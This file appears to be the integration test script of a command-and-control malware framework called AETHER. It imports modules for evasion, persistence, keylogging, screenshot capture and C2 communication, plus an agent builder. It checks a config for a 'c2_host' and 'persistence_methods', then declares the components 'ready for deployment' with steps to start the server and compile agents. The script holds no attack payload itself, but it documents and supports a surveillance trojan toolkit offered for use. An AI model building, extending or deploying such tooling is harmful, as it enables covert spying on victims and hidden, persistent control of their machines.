#!/usr/bin/env python3
"""
AETHER Integration Test
Verifies all components are functional
"""
import sys
import os

# Setup paths
sys.path.insert(0, os.getcwd())
sys.path.insert(0, os.path.join(os.getcwd(), 'server'))

print("=" * 70)
print("AETHER PROJECT - INTEGRATION TEST")
print("=" * 70)

# Test 1: Core imports
print("\n[1] Testing core imports...")
try:
    import json, base64, hashlib, time, threading, subprocess
    print("  ✓ Standard library imports")
except Exception as e:
    print(f"  ✗ Standard library: {e}")
    sys.exit(1)

# Test 2: Server components
print("\n[2] Testing server components...")
try:
    from crypto import CryptoHandler
    from sessions import SessionManager
    from commands.command_suite import AetherCommandSuite
    print("  ✓ Server imports")
except Exception as e:
    print(f"  ✗ Server imports: {e}")
    sys.exit(1)

# Test 3: Agent components (platform-dependent)
print("\n[3] Testing agent components...")
try:
    from agent.core.evasion import EvasionEngine
    from agent.core.persistence import PersistenceEngine
    from agent.core.communicator import AetherCommunicator
    print("  ✓ Agent core modules")
except ImportError as e:
    if "winreg" in str(e) or "win32" in str(e):
        print(f"  ⚠ Agent core (Windows-only): {e}")
    else:
        print(f"  ✗ Agent core: {e}")
        sys.exit(1)

# Test 4: Intelligence modules
print("\n[4] Testing intelligence modules...")
try:
    from agent.modules.intelligence.keylogger import Keylogger
    from agent.modules.intelligence.screenshot import ScreenshotCapturer
    print("  ✓ Intelligence modules (basic)")
except ImportError as e:
    if "PIL" in str(e) or "cv2" in str(e) or "win32" in str(e):
        print(f"  ⚠ Intelligence modules (Windows/optional deps): {e}")
    else:
        print(f"  ✗ Intelligence modules: {e}")

# Test 5: Builder components
print("\n[5] Testing builder components...")
try:
    from builder.compile import AetherBuilder
    print("  ✓ Builder components")
except Exception as e:
    print(f"  ⚠ Builder: {e}")

# Test 6: Session management
print("\n[6] Testing session management...")
try:
    sessions = SessionManager()
    sessions.add('test_session', {'hostname': 'TEST-PC'})
    if sessions.exists('test_session'):
        session = sessions.get('test_session')
        if session and session['hostname'] == 'TEST-PC':
            print("  ✓ Session management works")
        else:
            print("  ✗ Session data corrupted")
            sys.exit(1)
    else:
        print("  ✗ Session not added")
        sys.exit(1)
except Exception as e:
    print(f"  ✗ Session management: {e}")
    sys.exit(1)

# Test 7: Command suite
print("\n[7] Testing command suite...")
try:
    sessions = SessionManager()
    cmd_suite = AetherCommandSuite(sessions)
    
    # Test a few commands
    result = cmd_suite.execute('test_session', 'help')
    if result and 'data' in result:
        print("  ✓ Command execution works")
    else:
        print("  ✗ Command execution failed")
        sys.exit(1)
except Exception as e:
    print(f"  ✗ Command suite: {e}")
    import traceback
    traceback.print_exc()
    sys.exit(1)

# Test 8: Crypto
print("\n[8] Testing cryptography...")
try:
    crypto = CryptoHandler()
    data = {'test': 'data'}
    plaintext = json.dumps(data)
    
    encrypted = crypto.encrypt_fernet(plaintext)
    decrypted = crypto.decrypt_fernet(encrypted)
    
    # decrypt_fernet returns parsed JSON if valid JSON, so compare as dicts
    if isinstance(decrypted, dict) and decrypted == data:
        print("  ✓ Encryption/decryption works")
    elif decrypted == plaintext:
        print("  ✓ Encryption/decryption works")
    else:
        print(f"  ✗ Encryption/decryption mismatch: {decrypted} != {plaintext}")
        sys.exit(1)
except Exception as e:
    print(f"  ✗ Cryptography: {e}")
    sys.exit(1)

# Test 9: Configuration
print("\n[9] Testing configuration...")
try:
    with open('config.json', 'r') as f:
        config = json.load(f)
    
    # Check for required top-level keys
    required_keys = ['c2_host', 'persistence_methods']
    missing = [k for k in required_keys if k not in config]
    
    if not missing and len(config) > 5:
        print(f"  ✓ Configuration valid ({len(config)} keys)")
    else:
        print(f"  ✗ Configuration incomplete: {missing}")
        sys.exit(1)
except Exception as e:
    print(f"  ✗ Configuration: {e}")
    sys.exit(1)

# Summary
print("\n" + "=" * 70)
print("✓ INTEGRATION TEST PASSED")
print("=" * 70)
print("\nAll core components are functional and ready for deployment.")
print("\nNext steps:")
print("  1. Install dependencies: python3 install_deps.py")
print("  2. Configure settings: Edit config.json")
print("  3. Start server: python3 server/aether_server.py")
print("  4. Compile agents: python3 builder/compile.py")
print("=" * 70)
